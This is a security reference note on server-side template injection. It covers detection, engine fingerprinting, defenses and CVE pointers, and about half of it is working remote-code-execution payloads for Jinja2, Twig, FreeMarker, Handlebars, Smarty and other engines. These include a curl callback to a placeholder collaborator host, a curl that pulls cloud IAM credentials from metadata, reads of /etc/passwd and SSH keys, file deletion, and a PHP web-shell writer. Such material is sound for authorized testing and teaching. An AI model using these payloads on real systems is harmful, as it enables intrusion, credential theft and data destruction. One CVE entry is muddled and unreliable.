# Server-Side Template Injection

> Input rendered by a template engine executes engine syntax, often leading to RCE. **Deep dive:** [`Troubleshooting_Guide/ssti.md`](../../../../Troubleshooting_Guide/ssti.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** SSTI · A03:2021 Injection
**Status:** complete

## What it is
Server-side template injection occurs when user input is embedded into a server-side template that
is then rendered by a template engine (Jinja2, Twig, FreeMarker, ERB, etc.), so the input is
evaluated as template syntax rather than printed as data. Because templates can usually access
objects and methods, this commonly escalates from expression evaluation to full remote code
execution.

## How it works
The application builds a template string by concatenating untrusted input — for example
`render("Hello " + name)` instead of passing `name` as a sandboxed variable. The engine parses the
combined string, so an attacker who submits template directives (`{{...}}`, `${...}`, `<%= %>`)
gets them evaluated in the engine's context. From there the attacker walks the language's object
graph — Python's `__subclasses__`/`__mro__` to reach `Popen`, Java reflection or FreeMarker's
`Execute`, Node's prototype chain to `require` — to escape the template and run code on the host.

## Impact
Most engines allow escalation to remote code execution, giving full server compromise. Even
sandboxed engines (e.g. Django templates) leak sensitive configuration such as secret keys and
debug data. SSTI is also a strong pivot to SSRF (e.g. cloud metadata) and file read. Severity is
typically critical when RCE is reachable.

## How to detect
- A math probe matched to the syntax returns the computed value: `{{7*7}}` -> `49`, `${7*7}` -> `49`,
  `<%= 7*7 %>` -> `49`. Plain `7*7` echoed back unchanged means no evaluation.
- A polyglot like `${{<%[%'"}}%\` provokes a template parse error/stack trace that names the
  engine.
- Engine disambiguation: `{{7*'7'}}` returns `7777777` in Jinja2 but `49` in Twig.
- Blind cases confirm via time delay or out-of-band callback from an engine-specific RCE payload.

## Exploitation (summary)
Detect evaluation with a math probe, fingerprint the engine (math/string probes, error messages),
then select the engine-specific escalation: subclass traversal to `Popen` in Jinja2, the `_self`
environment in Twig, `Execute?new()` or reflection in FreeMarker, the prototype chain in
Handlebars. When input lands inside an existing expression, close out of it first. Confirm blind
cases with `sleep` or a DNS/HTTP callback. Full engine-by-engine payloads are in the Payloads
section and deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Detection & engine fingerprinting
Start with a universal polyglot that breaks most parsers, then narrow the engine with a math probe and the response it returns.

```text
${{<%[%'"}}%\
```

| Engine | Probe | Expected output |
|--------|-------|-----------------|
| Jinja2 | `{{7*7}}` | `49` |
| Twig | `{{7*7}}` | `49` |
| Tornado | `{{7*7}}` | `49` |
| FreeMarker | `${7*7}` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Handlebars | `{{7*7}}` | `{{7*7}}` (no eval — needs constructor chain) |
| Smarty | `{7*7}` | `49` |
| Velocity | `#set($x=7*7)$x` | `49` |

Disambiguate the two `{{7*7}}=49` engines with a string-multiply probe:

```text
{{7*'7'}}
# Jinja2 -> 7777777
# Twig   -> 49
```

### Code-context injection
When input lands inside an existing expression, close it first, then inject your own.

```text
}}{{7*7}}{{//      (Jinja2 / Tornado / Twig)
%>7*7<%=           (ERB)

# example against a name field rendered in code context
blog-post-author-display=user.name}}{{7*7}}   -> "Peter Wiener49"
```

### Jinja2 (Python)
Subclass traversal reaches `Popen`; the index varies per environment, so enumerate first.

```python
# enumerate to find subprocess.Popen, then execute
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0].strip()}}

# code-context variant
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')

# underscore filter blocked -> hex-escaped attr() chain
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# blind: time-based confirmation
{{''.__class__.__mro__[1].__subclasses__()[407]('sleep 5', shell=True).communicate()}}

# blind: DNS/HTTP callback
{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://YOUR-COLLABORATOR-URL', shell=True)}}

# SSRF pivot to cloud metadata
{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/', shell=True, stdout=-1).communicate()[0].strip()}}
```

### Twig (PHP)
Confirm with `{{7*7}}`, then abuse object methods or the `_self` environment.

```text
# arbitrary file read via avatar method, then GET /avatar?avatar=wiener
user.setAvatar('/etc/passwd','image/jpg')
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')

# destructive method call
user.gdprDelete()
```

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### ERB (Ruby)

```ruby
<%= 7*7 %>                                   # detection -> 49
<% system("rm /home/carlos/morale.txt") %>   # RCE
<%= File.read('/etc/passwd') %>              # file read
```

### FreeMarker (Java)
`${foobar}` triggers a recognisable template error. Use the `Execute` utility for RCE, or a reflection chain to escape a sandbox.

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("rm /home/carlos/morale.txt") }

# sandbox escape -> file read via reflection
${product.getClass()
  .getProtectionDomain()
  .getCodeSource()
  .getLocation()
  .toURI()
  .resolve('/home/carlos/my_password.txt')
  .toURL()
  .openStream()
  .readAllBytes()?join(" ")}
```

### Handlebars (Node.js)
No direct eval; walk the prototype chain to reach `require('child_process')`.

```handlebars
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push
          "return require('child_process').exec('rm /home/carlos/morale.txt');"
        }}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Smarty (PHP)

```smarty
{php}echo shell_exec('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Velocity (Java)

```velocity
#set($str=$class.inspect("java.lang.Runtime").type)
#set($runtime=$str.getRuntime())
#set($process=$runtime.exec("id"))
```

### Mako (Python)

```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Django (Python) — information disclosure
Django's template language is sandboxed (no direct RCE), but exposes config and debug data.

```django
{% debug %}                 {# enumerate available objects #}
{{settings.SECRET_KEY}}     {# leak signing key #}
```

### Engine RCE reference

| Engine | Syntax | RCE method |
|--------|--------|-----------|
| Jinja2 | `{{ }}`, `{% %}` | Subclass traversal -> Popen |
| Twig | `{{ }}` | `_self` object, registerUndefinedFilterCallback |
| ERB | `<%= %>` | `File.read`, `system()` |
| FreeMarker | `${ }`, `<# >` | `Execute?new()`, Java reflection |
| Handlebars | `{{ }}` | Prototype chain -> `require()` |
| Smarty | `{ }` | `{php}`, `writeFile` |
| Velocity | `${ }`, `#if` | ClassTool, `Runtime.exec` |
| Mako | `${ }`, `<% %>` | Python code execution |
| Tornado | `{{ }}` | Python code execution |
| Django | `{{ }}`, `{% %}` | Settings exposure, `{% debug %}` |

## Defenses
1. **Never concatenate user input into a template**; pass it only as data bound to a context
   variable, so it is rendered/escaped, never parsed as syntax (the primary fix).
2. **Do not let users supply templates.** If user-defined templates are a requirement, use a
   logic-less engine (e.g. Mustache) or a strict, vetted sandbox.
3. **Harden the engine** — enable sandbox/autoescape, disable dangerous features and globals, and
   keep the engine patched.
4. Run rendering in a **least-privilege, isolated** process/container to contain any escape.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Server-Side+Template+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Server-Side+Template+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=Server-Side+Template+Injection
- **GitHub Advisories** — https://github.com/advisories?query=Server-Side+Template+Injection
- **OSV** — https://osv.dev/list?q=Server-Side+Template+Injection
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Server-Side Template Injection <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2019-8341` — Jinja2 SSTI in Jinja itself (`from_string`) leading to code execution.
- `CVE-2016-10033` — PHPMailer RCE; while a mail-injection bug, it sits alongside the classic
  Atlassian Confluence FreeMarker/OGNL SSTI cases that popularized the class.
- `CVE-2022-26134` — Atlassian Confluence OGNL injection (template/expression injection) exploited
  in the wild for unauthenticated RCE.

## References
- PortSwigger Web Security Academy — Server-side template injection.
- OWASP — Server-Side Template Injection testing (WSTG).
- James Kettle (PortSwigger) — "Server-Side Template Injection: RCE for the modern webapp" research paper.
